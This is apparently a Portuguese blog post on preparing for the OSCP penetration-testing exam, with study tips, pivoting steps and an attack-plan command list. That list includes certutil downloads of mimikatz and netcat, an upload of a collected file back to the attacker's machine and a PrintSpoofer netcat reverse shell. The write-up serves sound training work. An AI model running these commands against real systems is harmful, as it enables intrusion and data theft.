@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>OSCP - Aprendizados - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     OSCP - APRENDIZADOS
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : OSCP - Aprendizados
+        autor  : offensive think
+        data   : Thu, Aug 22, 2024
+        tags   : certifications
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/oscp.html &lt;--
+
+---[ INDEX ]------------------------------------------------------------
+0 - INTRO
+1 - SOBRE A CERTIFICAÇÃO
+2 - ANTES DE MAIS NADA
+3 - MINHAS RECOMENDAÇÕES
+4 - LIÇÕES APRENDIDAS
+5 - PLANO DE ATAQUE
+6 - CHEAT SHEETS
+7 - REVERSE SHELL
+8 - PIVOTING
+9 - Powershell e Comandos Windows
+
+
+</pre>
+<a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F0bef1bfc-13f9-4c8f-b54c-0af0ed716655%2F425f9052-18ae-4b55-9fc4-799da3f10d60%2F2024-08-23_11_47_17-Credential_Renderer.png?width=1060&amp;table=block&amp;id=191443cc-36c2-4d8d-a2c5-0964a6a62d35" target="_blank"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F0bef1bfc-13f9-4c8f-b54c-0af0ed716655%2F425f9052-18ae-4b55-9fc4-799da3f10d60%2F2024-08-23_11_47_17-Credential_Renderer.png?width=1060&amp;table=block&amp;id=191443cc-36c2-4d8d-a2c5-0964a6a62d35"  ></a>
+<pre>
+
+
+---[ 0x00 - INTRO ]-----------------------------------------------------
+Muitas postagens são no sentido de detalhar o dia a dia da prova, o que usou para estudo, como é a prova, etc. Entendo que estes ajudam também, mas essa não é minha intenção, mas sim, relatar algumas experiências de forma direta que podem ajudar a quem está buscando esta certificação.
+Para mim, como todo curso, toda certificação, mesmo que seja sobre um assunto que você acha que já sabe, sempre haverá o que aprender! Nem que seja um jeito novo de fazer a mesma coisa!
+
+
+---[ 0x01 - SOBRE A CERTIFICAÇÃO ]--------------------------------------
+Hoje eu possuo certificações da EC COUNCIL (CEH v10 ANSI e PRACTICAL) , da Offensive Security ( OSCE, OSCP ) e da INE( eWPT, eCPPTv2 ).
+Gosto bastante das certificações da INE (antiga eLeansecurity) por elas serem mais próximas de um trabalho real de um pentest do que um CTF/Desafio onde se busca provar que conseguiu determinado objetivo através de flags.
+Já as certificações da Offensive Security são conhecidas pelo tempo restrito e pelo bordão Try Harder.
+Esse é um ponto interessante e sempre muito debatido pois se pensarmos bem acho que não seremos contratados para nenhum pentest onde lhe darão 24h para invadir. Nesse ponto, as certificações da INE são muito mais realistas. Mas há um ponto ai. Quando você é “chamado” para executar uma tarefa de uma certa dificuldade e sabe que o tempo é bem restrito, o seu cérebro trata de fazer você focar e prestar atenção, pois sem isso, você não alcançará o objetivo. E você descobrirá pelo bem ou pelo mal que você deve se planejar, antever, se preparar. O dia da prova de certificação é o dia do Ataque.
+
+
+---[ 0x02 - ANTES DE MAIS NADA ]----------------------------------------
+Desenvolvi um simples webserver em python para me ajudar nessa jornada. O problema que eu queria resolver era: Precisava de um webserver simples como rodar python3 -m http.server mas que não ligasse se o nome do que eu precisava estava em maiúscula ou minúscula e que também aceitasse upload de arquivo para eu não ter que ficar me preocupando em mandar por FTP, SMB, etc. Vai que existia algum firewall e quase toda máquina está liberado o acesso a porta 80 ao menos.
+Então fica a dica de baixar e usar →  ‣
+
+
+---[ 0x03 - MINHAS RECOMENDAÇÕES ]--------------------------------------
+- Antes de tudo, lembre-se! As máquinas são vulneráveis! Você consegue!  Isso não é um pentest que você fará e pode ou não encontrar uma vulnerabilidade! Ela existe, é explorável e existe exploit público!
+- Se trata de Enxergar e não simplesmente olhar! Quem olha vê só metade! Esteja atento a tudo! O titulo do site que você as vezes nem presta atenção! A resposta de um GET que vem com um cabeçalho que lhe dar alguma pista! Enxergue!
+- Expanda a mente. Invadir um sistema não acontece só porque existe uma falha no software e com isso tem um exploit público! Você pode invadir um sistema, uma máquina, simplesmente porque achou uma credencial de acesso! Lembre-se disso!
+- Essa é uma certificação que tem um tempo restrito e eles sabem disso. Pediram em algum momento do curso para você usar uma máquina windows com visual studio para compilar aquele exploit que só existe em código fonte? Então! Se você está indo para esse lado, volte.
+- É uma prova, não um exercício de red team, logo não tem que ser stealthy, use a abuse das opções -T5 --min-rate 2000 do nmap.
+- Se prepare. E isso não tem a ver com todas as recomendações que você vai encontrar aos montes ai de resolver máquinas XYZ, fazer laboratórios, etc.  Sim, isso é válido, mas aqui estou falando de preparar seu ambiente. Se você fosse convocado para uma guerra você levantaria da cadeira e iria de short e sandália? Imagino que não. E isso é uma guerra! Logo, se prepare. Você tem pouco tempo para procurar! *Crie um Plano de Ataque!*Que ferramentas você acha que vai usar? Baixe e instale. Quais exploits você acha que poderá ser útil para privesc linux, windows? Potatos? Baixe todas as batatas!Que wordlists você espera usar ? Saiba onde estão. Anote.Acha que dá para automatizar alguma coisa? Automatize. Se achar um zip com senha , sabe quebrar? se achar um arquivo do keepass sabe quebrar? se achar um passwd e um shadow, sabe quebrar a senha do usuário? Pense nas possibilidades, instale as ferramentas necessárias e deixe anotado como fazer caso precise!Que sites com cheatsheets você acha interessante? Gtfobin (https://gtfobins.github.io/) ? Lolbas (https://lolbas-project.github.io/) ? revshells ( https://lolbas-project.github.io/ )? Deixa tudo aberto no navegar no seu host!Qual ferramenta vai usar assim que receber o ambiente? nmap? autorecon (https://github.com/Tib3rius/AutoRecon)? osixtyone para snmp? Anota os comandos para copy paste.  Precisa mesmo esperar a ferramenta lhe dizer que existe para só então atacar? Você vai ser castigado por tentar acessar um site na porta 80 e ele não existir? Não? Então teste logo. Por exemplo, o SNMP se acessível pode lhe dar informações valiosas da máquina. Testa logo imaginando que tá aberto. No máximo você não vai conseguir e partir pra outra.  Baixe tudo e mais um pouco do que precisa e que não precisa. Coloque tudo em um diretório ( ~/tools por exemplo) e deixe ele disponível via web (https://github.com/diegoalbuquerque/offensivewebserver) Deixa tudo preparado: Máquina Linux, que ferramentas você espera usar para ajudar à escalar privilégios? Máquina windows standalone, quais? Máquina windows em domínio, sharphound, powerview? *Entrou na máquina, leva tudo pra dentro*. Deixa anotado no plano: COPY e PASTE de comandos! Máquina linux: Copia para /tmp Máquina windows: Copia para c:\users\public
+- Escalar privilégio não quer dizer sair de um usuário simples direto para root ou domain admin, que seja. Escalar privilégio é obter mais privilégios do que você já tem, que pode ser simplesmente indo para outro usuário! *Aqui vale uma ressalva muito importante!** Você pode escalar privilégio simplesmente por achar na máquina a senha de um outro usuário ou mesmo do root, por exemplo, porque foi colocada dentro de um script de automatização! Não obrigatoriamente será por uma vulnerabilidade! **Outra ponto de atenção!* Existe uma coisa no mundo chamada Hardening e mitigação! Cuidado. Você pode ver uma vulnerabilidade, o software ou kernel está na versão correta, mas não ser explorável porque foi mitigado! O caminho pode ser outro e deixaram ali de propósito só pra você ficar batendo cabeça por horas tentando fazer funcionar algo que não vai funcionar nunca!
+- Invadiu uma máquina windows do domínio? Qual é seu usuário? É um usuário local? Lembre-se, com usuário local você não acessa o domínio, logo não tem como usar powerview, etc. Precisa comprometer um usuário do domínio para ter acesso ao domínio.Ops! Um detalhe. Pode ser que seu usuário não seja do domínio, mas a sua máquina esteja no domínio e uma máquina no domínio tem um HASH no LSASS, que pode ser usado para OVER-PASS-THE-HASH e consultar o domínio!!!
+- Vasculhe! Vasculhe! Vasculhe! Tem algum software diferente instalado? Olhe. Veja as pastas, o que tem dentro delas, dentro dos arquivos. Existem scripts na raiz? Existe um arquivo que aparentemente não faz nada? Não olhe, enxergue!  As vezes algo pode ser usado como uma credencial, uma senha para um password spray.
+- Não obrigatoriamente você precisa criar um shell reverso ou mesmo ficar em um shell sem muita interatividade. Crie um usuário e coloque-o no grupo que permite RDP e faça RDP!
+- Você vai precisar pivotear pois já é esperado isso. Aprendar a usar o Ligolo-NG. É fácil demais e uma mão na roda. Abaixo eu coloco um passo a passo que deixei anotado (plano de ataque, lembra!) e que usei!
+- Nem sempre o ponto de entrada está a olhos vistos! As vezes você pode encontrar um site web disponível mas não ter nenhuma vulnerabilidade. Quase sempre, se você encontrar um site que parece ser apenas um template de site, já imagine que ali não tem nada, mas pode ter algo escondido em outro diretório!  Enumere! Lembre-se, um site pode ter uma página de administração e que não vai tá de cara no robots.txt, ela simplesmente não é conhecida publicamente, mas se você enumerar vai achar! Achou uma tela de login. Não, não obrigatoriamente você vai entrar porque tem um SQL Injection, etc. Já pensou em simplesmente acessar usando credencial default ? Qual é o sistema? Procure no google pelas credenciais default! Vai enumerar! Seja efetivo! Você tem pouco tempo. A máquina é um Windows? Ela é case insensitive, ou seja, index.html é o mesmo que INDEX.html. Para que testar duas vezes? Crie ou já dê um jeito de filtrar das wordlists, termos duplicados e em caso de windows, transforme tudo em minúscula. ( cat wordlist | sort -fu &gt; wordlist-case-insensitive )O nmap ou algo do tipo não disse se é windows ou linux? Vamos dizer que index.html seja uma página válida.  Testa http://site/index.html  e http://site/inDeX.html . Se der a mesma coisa é windows, afinal, tanto faz pro windows maiúscula como minúscula e dificilmente alguém vai ter criado a mesma versão da página variando letras assim.
+- Experiências pessoais, são experiências pessoais. Sempre bom lembrar que as experiências de cada um tem influência direta no quanto e como cada um estudou para obter a certificação.  Leve isso em conta.  Pense se você tem domínio ou não sobre os assuntos cobrados na certificação.
+- *&gt;&gt;&gt;* *DOCUMENTE seu passo a passo!* *&lt;&lt;&lt;* Faça um passo a passo de todos os comandos usados para comprometer uma máquina e depois escalar privilégios. Caso você precise começar do zero (reiniciar seu kali, reverter máquina, etc.) você voltará ao estado atual rapidamente. * Inclusive, coloque isso no seu relatório para cada máquina! *
+- Nem tudo é Reverse Shell! Invadiu a primeira máquina que dá acesso ao ambiente AD, criou um túnel através dela usando o Ligolo-NG, conseguiu invadir a máquina interna e ai precisa que essa máquina interna use alguma ferramenta que você tem no seu kali (em ~/tools por exemplo), ou mesmo você quer um shell nela, não obrigatoriamente você precisa percorrer o caminho inverso!!! Se você tem uma credencial de acesso aquela máquina, pode ser que você consiga acessá-la diretamente usando um Evil-WinRM com uma credencial e fazer upload do arquivo por ele!
+
+
+---[ 0x04 - LIÇÕES APRENDIDAS ]-----------------------------------------
+- Dá para fazer!
+- A OSCP me fez enxergar ainda mais que nem tudo é vulnerabilidade. O fator usuário é muito importante nessa conta. Uma credencial colocada em um arquivo, uma senha compartilhada em uma mensagem, um texto que pode ter sido utilizado como senha, tudo isso pode levar ao comprometimento da máquina (por exemplo, acesso ssh, Evil-WinRM) sem nem mesmo precisar explorar uma única vulnerabilidade.
+- Enumerar é preciso! Melhorar cada vez mais essa técnica de fuzzing a fim de tentar encontrar o que ninguém vê: aquele arquivo deixado no servidor web, aquele diretório que a pessoa achou que ninguém acharia só por não estar indexado, etc.
+- Se enumerar é preciso, é preciso estar atendo. Para que você vai enumerar Index.html, index.html, INDEX.html, usando uma lista, se pode procurar só por index.html caso a máquina seja windows ?! Mais rápido, menos barulho!
+- Uma vulnerabilidade pode não estar corrigida mas pode estar mitigada, logo, pode ser que você não consiga explorá-la.
+- Cada vez mais é correto o pensamento de passar 90% do tempo afiando o machado e os 10% restante cortando a árvore! Planejar, antever, se preparar é necessário.
+
+
+---[ 0x05 - PLANO DE ATAQUE ]-------------------------------------------
+Abaixo é um pequeno exemplo do que deixei anotado (muitos podem chamar de metodologia, mas eu não coloquei metodologia por ser simplesmente um conjunto de comandos que deixei anotado para executar logo que iniciar ou a medida que fosse avançando)
+
+    
+    PREPARACAO NO DECORRER DOS ESTUDOS:
+    cat /usr/share/dirb/wordlists/common.txt /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt &gt; /home/kali/wordlists/my-list.txt
+    cat /home/kali/wordlists/my-list.txt | sort -u  &gt; /home/kali/wordlists/my-list-linux.txt
+    cat /home/kali/wordlists/my-list.txt | sort -fu &gt; /home/kali/wordlists/my-list-windows.txt
+    
+    echo public &gt; community
+    echo private &gt;&gt; community
+    echo manager &gt;&gt; community
+    
+    
+    ENUMERAÇÃO INICIAL: 
+    
+    vim hosts.txt # put all hosts in this file
+    autorecon -t hosts.txt --nmap-append=&quot;--min-rate 2000&quot; --exclude-tags=&quot;top-100-udp-ports&quot; --exclude-tags nikto --exclude-tags dirbuster -vv -o autorecon-results
+    
+    onesixtyone -c community -i hosts
+    
+    
+    IP=1.1.1.1;PORT=80;OS=&quot;windows&quot;;ffuf -u http://$IP:$PORT/FUZZ -w /home/kali/wordlists/my-list-$OS.txt -c -ic -mc all -fc 404 -t 300 | tee -a resultado-ffuf-$IP.txt
+    
+    
+    POST EXPLOITATION WINDOWS:
+    
+    UPLOAD TOOLS:
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;tee-x64.exe          c:\users\public\tee.exe
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;winpeasx64.exe       c:\users\public\winpeasx64.exe
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;/ligolo-ng/agent.exe c:\users\public\agent.exe
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;accesschk64.exe      c:\users\public\accesschk64.exe 
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;nc.exe               c:\users\public\nc.exe
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;mimikatz.exe         c:\users\public\mimikatz.exe 
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;/sessiongopher.ps1   c:\users\public\sessiongopher.ps1
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;/PowerUp.ps1         c:\users\public\PowerUp.ps1
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;/PowerView.ps1       c:\users\public\PowerView.ps1
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;/rubeus.exe          c:\users\public\rubeus.exe
+    
+    INFOS:
+    dir c:\ # Something different on the root ?!?!
+    tree c:\users /F /A  | c:\users\public\tee.exe -a c:\users\public\exfil-dir-users.txt
+    Invoke-RestMethod -Uri  http://&lt;ip-kali&gt;/  -Method Post -Headers @{ &quot;File-Name&quot; = &quot;exfil-dir-users.txt&quot; } -InFile &quot;c:\users\public\exfil-dir-users.txt&quot;
+    
+    PRIVESC:
+    certutil -urlcache -split -f http://&lt;ip-kali&gt;/windows-privesc/printspoofer64.exe c:\users\public\printspoofer.exe
+    c:\users\public\printspoofer.exe -c &quot;c:\users\public\nc &lt;ip-kali&gt; 1337 -e cmd.exe&quot;
+
+
+
+---[ 0x06 - CHEAT SHEETS ]----------------------------------------------
+Algumas anotações de comandos que fiz para ter acesso rápido e alguns links de cheat sheets que achei interessante e podem ajudar.
+
+
+---[ 0x07 - REVERSE SHELL ]---------------------------------------------
+Acesse http://www.revshells.com e seja feliz. Tem tudo lá!
+
+
+---[ 0x08 - PIVOTING ]--------------------------------------------------
+
+:: Ligolo-NG (‣)
+
+https://www.youtube.com/watch?v=DM1B8S80EvQ
+https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9
+agent → executável que rodará na vítima!
+proxy → interface do ligolo-ng no seu kali que comandará tudo!
+ON KALI
+
+    sudo ip tuntap add user kali mode tun ligolo
+    sudo ip link set ligolo up
+    
+    /home/kali/tools/ligolo-ng/proxy -selfcert
+
+ON VICTIM WINDOWS
+
+    c:\&gt;c:\users\public\agent.exe -connect &lt;kali-ip&gt;:11601 --ignore-cert
+
+ON KALI
+
+    ligolo&gt; session  #-&gt; Choose  1
+    ligolo-session1&gt; ifconfig #-&gt; get internal network range at other interface (ex: 10.10.10.1/24)
+    
+    kali# sudo ip route add 10.10.10.0/24 dev ligolo
+    
+    ligolo-session1&gt; start
+    
+    use the tools, like:
+    # crackmapexec smb 10.10.10.0/24
+
+Se precisar acessar seu kali a partir de uma máquina interna, por exemplo, crie um listenner no agente para que ele redirecione a comunicação para seu Kali!
+ON KALI
+
+    ligolo-session1&gt; listener_list
+    ligolo-session1&gt; listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
+
+Agora, quando uma máquina interna tentar acessar o* IP interno da máquina que tem o agente rodando*, na porta 8080, o tráfego será redirecionado, pelo agente, para a porta 80 do kali. Sim, o IP no parâmetro --to é 127.0.0.1 e não o IP do kali! É tipo, o agente ao receber a comunicação nessa porta entende algo como: É para mim, deixa eu mandar para o meu proxy!
+Agora vamos supor que existe um site na máquina invadida ou algum serviço, que só escute na interface local, ou seja, eu não consigo acessar de fora, só da própria máquina!
+Criamos um Listener no agente para que qualquer conexão que vá para uma porta XPTY seja redirecionada para a própria máquina na porta interna que ele tá escutando.
+Vamos exemplificar com um serviço web que só é acessível na própria máquina através do endereço, por exemplo, http://127.0.0.1/phpmyadmin :
+NO KALI
+
+    ligolo-session1&gt; listener_list
+    ligolo-session1&gt; listener_add --addr 0.0.0.0:8081 --to &lt;ip_interface_interna_maquina_invadida&gt;:80 --tcp
+
+Agora você pode no seu kali acessar http://&lt;ip-externo-maquina-invadida&gt;:8081 e conseguirá acessar o site que estaria disponível apenas internamente!
+
+
+---[ 0x09 - POWERSHELL E COMANDOS WINDOWS ]-----------------------------
+
+    #PORTAS ABERTAS
+    netstat -tupan
+    
+    #HABILITAR TELNET NO WINDOWS 7
+    pkgmgr /iu:”TelnetClient”
+    
+    #PING SWEEP WINDOWS
+    for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.10.%i &gt; nul &amp;&amp; echo 10.10.10.%i is up.
+
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
